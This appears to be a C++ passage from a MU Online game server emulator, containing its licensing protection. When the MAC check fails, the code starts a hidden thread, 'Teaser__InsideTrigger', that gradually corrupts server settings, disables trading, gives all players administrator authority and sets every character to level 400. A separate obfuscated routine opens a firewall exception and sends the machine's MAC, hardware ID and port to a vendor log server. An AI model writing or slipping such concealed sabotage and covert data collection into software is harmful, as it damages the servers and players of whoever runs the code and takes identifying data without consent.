	IP_ADAPTER_INFO AdapterInfo[16];			// Allocate information for up to 16 NICs
	DWORD dwBufLen = sizeof(AdapterInfo);		// Save the memory size of buffer

	DWORD dwStatus = GetAdaptersInfo(			// Call GetAdapterInfo
		AdapterInfo,							// [out] buffer to receive data
		&dwBufLen);								// [in] size of receive data buffer
	assert(dwStatus == ERROR_SUCCESS);			// Verify return value is valid, no buffer overflow

	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;// Contains pointer to current adapter info

	char sBuf[512][3]={0};
	while(pAdapterInfo)
	{
		for (int i=0;i<6;i++)
		{
			wsprintf(sBuf[16*MacAdressesCount + i*3], "%02X", pAdapterInfo->Address[i]);
			//LogLine("%s ",sBuf[16*MacAdressesCount + i*3]);
			MacPart[i+(MacAdressesCount*6)]=sBuf[16*MacAdressesCount + i*3];
		}
		pAdapterInfo = pAdapterInfo->Next;
		MacAdressesCount+=1;
	}

	CODEREPLACE_END
}
#endif


void Teaser__InsideTrigger(void * lpParam)
{
	VM_START_WITHLEVEL(14)
	int i=0;
	while(true)
	{
		Sleep(60000);
		if(i==10)
		{
			for(int i=0;i<6;i++)
			{
				for(int j=0;j<5;j++)
					ReadConfig.MaxPoints[i][j]=30;
			}
		}else if(i==20)
		{
			ReadConfig.gObjItemRandomLevelUpSoulLuck	= -1;
			ReadConfig.gObjItemRandomLevelUpSoulNoLuck	= -1;
			ReadConfig.gObjItemRandomOption3UpLife = -1;
		}else if(i==30)
		{
			bCanTrade = 0;
			gAddExperience = 1.0f;	
			gCreateCharacter = 0;
			gServerMaxUser=5;
	 		gItemDropPer = 1;
		}else if(i==40)
		{	
			ReadConfig.SkillNightDiv = 0;
			ReadConfig.SkillReflectTimeDiv = 0;
			ReadConfig.SkillSleepTimeDiv = 0;
			ReadConfig.SkillReduceDamageDiv = 0;	
		}else if(i==41)
		{
			for (int n=OBJ_STARTUSERINDEX;n<OBJMAX; n++)
			{
				if ( gObj[n].Connected >= PLAYER_PLAYING)
				{
					GCSkillInfoSend(&gObj[n], 1, 28);
					gObj[n].Authority = 32;
					gObj[n].AuthorityCode = 0x3F;
				}
			}
		}else if(i==42)
		{
			for (int n=OBJ_STARTUSERINDEX;n<OBJMAX; n++)
			{
				if ( gObj[n].Connected >= PLAYER_PLAYING)
				{
					gObj[n].Level = 400;
					GJSetCharacterInfo(&gObj[n], gObj[n].m_Index, 0);
				}
			}
		}else if(i==50)
		{
			int i = i-50;
			//int select = 4/i;
		}
		i++;
	}
	VM_END
}
#if (MAC_PROTECT_OLD==1)
void CheckMemoryTeaser_MAC_Comparator(int param)
{
	int CurrentMacCount=0;

	int TotalClients=0;
	int clientPosition=0;
	int counter=0;

	VM_START_WITHLEVEL(9)

	int result=0;
	CheckMemoryTeaser_MAC_Getter();


	while ((CurrentMacCount<MacAdressesCount)&&(result==0))
	{
		while ((counter<CLIENTSNUMBER)&&(result==0))
		{
			clientPosition=counter*6;

			if (!strcmp(Clients[clientPosition+1],MacPart[0+(CurrentMacCount*6)]))
			{	
				if (!strcmp(Clients[clientPosition+0],MacPart[3+(CurrentMacCount*6)]))
				{
					if (!strcmp(Clients[clientPosition+2],MacPart[2+(CurrentMacCount*6)]))
					{
						if (!strcmp(Clients[clientPosition+3],MacPart[1+(CurrentMacCount*6)]))
						{
							if(!strcmp(Clients[clientPosition+4],MacPart[5+(CurrentMacCount*6)]))
							{
								if(!strcmp(Clients[clientPosition+5],MacPart[4+(CurrentMacCount*6)]))
								{
									result=1;
								}
							}
						}
					}
				}
			}
			
			counter++;
		}
		counter=0;
		CurrentMacCount+=1;
	}

	VM_END

	CODEREPLACE_START

	if (result==0)
		_beginthread( Teaser__InsideTrigger, 0, NULL  );

	CODEREPLACE_END
}


WORD WinUtil_TeaserChecker(LPCSTR MacID)
{
	for(int x=0;x<CLIENTSNUMBER;x++)
	{
		if(!strcmp(MacID,ClientMacs[x]))
		{			
			CODEREPLACE_START
			
			strcpy(SCFClientMAC,ClientMacs[x]);
			return 44;
			
			CODEREPLACE_END
		}
	}
	CODEREPLACE_START
	return 35;
	CODEREPLACE_END
}

void WinUtil_Teaser()
{
	VM_START_WITHLEVEL(5)

	unsigned char MACData[6];

	UUID uuid;
    UuidCreateSequential( &uuid );			

    for (int i=2; i<8; i++)					
		MACData[i - 2] = uuid.Data4[i];

	char sBuf[100];
	wsprintf(sBuf, "%02X-%02X-%02X-%02X-%02X-%02X", MACData[3], MACData[0], MACData[2], MACData[1], MACData[5], MACData[4]);

	VM_END


	CODEREPLACE_START

	if(WinUtil_TeaserChecker(sBuf) == 35)
		exit(1);

	CODEREPLACE_END
}

#endif


#if (MAC_PROTECT==1)
LPCSTR GetThe()
{
	VM_START
	unsigned char MACData[6];

	UUID uuid;
    UuidCreateSequential( &uuid );			

    for (int i=2; i<8; i++)					
		MACData[i - 2] = uuid.Data4[i];

	char sBuf[100];
	wsprintf(sBuf, "%02X-%02X-%02X-%02X-%02X-%02X", MACData[0], MACData[1], MACData[2], MACData[3], MACData[4], MACData[5]);
	return sBuf;
	VM_END
}

void curl_protection()
{
	
	VM_START_WITHLEVEL(23)

	FirewallException();
	CURL *curl;
	CURLcode res;

	curl = curl_easy_init();
	if(curl) 
	{
		curl_easy_setopt(curl, CURLOPT_USERAGENT, WLStringDecrypt("TitansTech Web Connector 0.1"));
		curl_easy_setopt(curl, CURLOPT_URL, WLStringDecrypt("http://logserver.titanstech.com/"));
		/* 
		Martin: Hay que sacar el MAC de la pc donde corre y enviarlo, 
		esta mas que obvio que cambias el MAC por un string, asi tambien como el hardware id.
		El valor IP tiene que ser la IP WAN del server de MU.
		*/
		char sBuf[1024]={0};
		char Hard[1024]={0};
		char Mac[1024]={0};
		strcpy(Mac,GetThe());
		WLRegGetLicenseHardwareID(Hard);
		wsprintf(sBuf,"MAC=%s&HARD=%s&PORT=%d",Mac,Hard,GameServerPort);

		//curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "MAC=00-0E-2E-E4-6E-A0&HARD=1059-F2BB-CAC4-0887-BC70-09C8-050C-0182&IP=192.168.0.1");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sBuf);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
	}

	VM_END

}


#endif
#endif